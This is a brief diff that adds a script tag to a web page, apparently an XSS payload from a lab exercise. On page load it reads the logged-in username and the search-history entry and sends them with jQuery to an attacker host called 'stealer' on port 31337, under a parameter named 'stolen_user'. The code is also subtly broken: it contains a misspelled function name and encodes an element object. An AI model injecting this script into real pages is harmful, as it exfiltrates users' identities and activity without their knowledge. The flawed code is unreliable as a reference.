@@ -1,0 +1,3 @@
+<script>
+    $(document).ready(function(){var username=document.getElementById("logged-in-user").innerHTML;var lastSearch=document.getElementById("history-list").innerHTML;var lastSearchItem=document.getElementsByClassName("list-group-item")[1];var stealerURL="http://stealer:31337/?stolen_user="+bencodeURIComponent(username)+"&last_search="+encodeURIComponent(lastSearchItem);$.get(stealerURL);});
+</script>
